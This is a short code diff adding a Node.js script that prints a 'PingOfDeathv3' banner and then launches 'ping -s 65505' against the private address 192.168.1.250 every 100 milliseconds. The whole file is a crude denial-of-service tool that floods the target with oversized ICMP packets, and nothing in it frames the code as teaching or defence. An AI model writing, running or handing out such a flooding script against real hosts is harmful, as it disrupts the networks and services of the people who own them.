@@ -1,0 +1,6 @@
+import gradient from 'gradient-string'
+import {exec} from "child_process"
+console.log(gradient(['red','magenta'])('      ├──> PingOfDeathv3 Starting > 192.168.1.250'));
+setInterval(()=>{
+    exec('ping -s 65505 192.168.1.250');
+},100);
